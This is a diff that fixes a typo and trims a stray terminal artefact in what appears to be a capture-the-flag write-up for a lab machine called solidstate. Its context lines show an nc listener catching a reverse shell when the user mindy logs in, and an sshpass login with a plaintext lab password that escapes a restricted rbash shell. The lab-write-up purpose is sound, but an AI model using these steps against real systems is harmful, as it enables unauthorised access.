@@ -348,7 +348,7 @@ pyenv-virtualenv: prompt changing will be removed from future release. configure
 └─$
 ```
 
-Logging in as mindy triggers the revershe shell
+Logging in as mindy triggers the reverse shell
 
 ```
 $ nc -nvlp 6666          
@@ -376,7 +376,7 @@ mindy
 For further logins it is quicker to escape mindy's limited rbash with
 
 ```
-$ sshpass -p 'P@55W0rd1!2@' ssh mindy@10.129.200.16 -t bash             127 ⨯
+$ sshpass -p 'P@55W0rd1!2@' ssh mindy@10.129.200.16 -t bash 
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$
 ```
 
